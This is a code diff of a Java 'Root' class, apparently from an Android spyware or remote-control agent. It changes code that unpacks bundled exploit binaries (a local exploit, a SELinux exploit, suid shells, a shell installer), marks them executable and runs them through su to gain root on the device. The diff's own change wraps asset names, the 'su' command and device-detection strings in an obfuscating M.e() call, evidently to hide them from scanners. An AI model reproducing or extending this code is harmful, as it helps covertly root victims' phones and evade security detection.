@@ -42,6 +42,7 @@ public class Root {
 	public static String method = "";
 	public static Date startExploiting = new Date();
 	private static int askedSu = 0;
+	private final static String SU = M.e("su");
 
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
@@ -294,7 +295,7 @@ public class Root {
 			});
 			thread.start();
 			Utils.sleep(10000);
-			
+
 			if (PackageInfo.checkRoot()) {
 				Status.setRoot(true);
 
@@ -312,11 +313,11 @@ public class Root {
 		// suidext
 
 		try {
-			InputStream streamS = Utils.getAssetStream("s.bin");
+			InputStream streamS = Utils.getAssetStream(M.e("s.bin"));
 			fileWrite(suidext.getName(), streamS, Cfg.RNDDB);
 			Execute.execute(M.e("/system/bin/chmod 755 ") + suidext);
 
-			ExecuteResult res = Execute.execute(new String[] { "su", "-c", suidext.getFilename() + " rt" });
+			ExecuteResult res = Execute.execute(new String[] { SU, "-c", suidext.getFilename() + " rt" });
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) execute 2: " + suidext + " ret: " + res.exitCode);
@@ -356,9 +357,9 @@ public class Root {
 		try {
 
 			// selinux_suidext
-			InputStream streamJ = Utils.getAssetStream("j.bin");
+			InputStream streamJ = Utils.getAssetStream(M.e("j.bin"));
 			// shell_installer.sh
-			InputStream streamK = Utils.getAssetStream("k.bin");
+			InputStream streamK = Utils.getAssetStream(M.e("k.bin"));
 
 			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
 			fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);
@@ -376,7 +377,7 @@ public class Root {
 
 			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);
 
-			ExecuteResult res = Execute.execute(new String[] { "su", "-c",
+			ExecuteResult res = Execute.execute(new String[] { SU, "-c",
 					shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
 
 			if (Cfg.DEBUG) {
@@ -417,7 +418,7 @@ public class Root {
 		try {
 
 			// selinux_suidext
-			InputStream streamJ = Utils.getAssetStream("j.bin");
+			InputStream streamJ = Utils.getAssetStream(M.e("j.bin"));
 			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
 
 			if (Cfg.DEBUG) {
@@ -426,7 +427,7 @@ public class Root {
 
 			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext);
 
-			ExecuteResult res = Execute.execute(new String[] { "su", "-c", selinuxSuidext.getFilename() + " rt" });
+			ExecuteResult res = Execute.execute(new String[] { SU, "-c", selinuxSuidext.getFilename() + " rt" });
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) execute 2: " + res.exitCode);
@@ -459,8 +460,8 @@ public class Root {
 		String version = properties.getProperty(M.e("os.version"));
 		final PackageManager pm = Status.getAppContext().getPackageManager();
 
-		if (version.contains("cyanogenmod") || version.contains("-CM-")
-				|| pm.hasSystemFeature("com.cyanogenmod.account") || pm.hasSystemFeature("com.cyanogenmod.updater")) {
+		if (version.contains(M.e("cyanogenmod")) || version.contains(M.e("-CM-"))
+				|| pm.hasSystemFeature(M.e("com.cyanogenmod.account")) || pm.hasSystemFeature(M.e("com.cyanogenmod.updater"))) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkFramarootExploitability) cyanogenmod");
 			}
@@ -483,7 +484,7 @@ public class Root {
 			return false;
 		}
 		// preprocess/expl_check
-		InputStream stream = Utils.getAssetStream("h.bin");
+		InputStream stream = Utils.getAssetStream(M.e("h.bin"));
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkFramarootExploitability) ");
 		}
@@ -530,7 +531,7 @@ public class Root {
 		}
 
 		// preprocess/selinux_check
-		InputStream stream = Utils.getAssetStream("d.bin");
+		InputStream stream = Utils.getAssetStream(M.e("d.bin"));
 
 		try {
 			fileWrite(exploitCheck, stream, Cfg.RNDDB);
@@ -567,7 +568,7 @@ public class Root {
 		final String path = filesPath.getAbsolutePath();
 		final String localExploit = M.e("l");
 		// preprocess/local_exploit
-		InputStream stream = Utils.getAssetStream("l.bin");
+		InputStream stream = Utils.getAssetStream(M.e("l.bin"));
 
 		try {
 			fileWrite(localExploit, stream, Cfg.RNDDB);
@@ -577,7 +578,7 @@ public class Root {
 			// Unpack the suid shell
 			final String suidShell = M.e("ss"); // suid shell
 			// preprocess/suidext
-			InputStream shellStream = Utils.getAssetStream("s.bin");
+			InputStream shellStream = Utils.getAssetStream(M.e("s.bin"));
 
 			fileWrite(suidShell, shellStream, Cfg.RNDDB);
 
@@ -975,9 +976,9 @@ public class Root {
 
 			try {
 				// selinux_suidext
-				InputStream streamJ = Utils.getAssetStream("j.bin");
+				InputStream streamJ = Utils.getAssetStream(M.e("j.bin"));
 				// shell_installer.sh
-				InputStream streamK = Utils.getAssetStream("k.bin");
+				InputStream streamK = Utils.getAssetStream(M.e("k.bin"));
 
 				fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
 				fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);
@@ -997,7 +998,7 @@ public class Root {
 
 				Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);
 
-				ExecuteResult res = Execute.execute(new String[] { "su", "-c",
+				ExecuteResult res = Execute.execute(new String[] { SU, "-c",
 						shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
 
 				if (Cfg.DEBUG) {
@@ -1040,10 +1041,10 @@ public class Root {
 			final String selinuxSuidext = M.e("qj"); // selinux_suidext
 			final String suidext = M.e("ss"); // suidext (standard)
 
-			InputStream streamExpl = Utils.getAssetStream("g.bin"); // selinux_exploit
-			InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext
+			InputStream streamExpl = Utils.getAssetStream(M.e("g.bin")); // selinux_exploit
+			InputStream streamSelinuxSuidext = Utils.getAssetStream(M.e("j.bin")); // selinux_suidext
 																				// rilcap
-			InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext
+			InputStream streamSuidext = Utils.getAssetStream(M.e("s.bin")); // suidext
 																		// rilcapn
 																		// (standard)
 
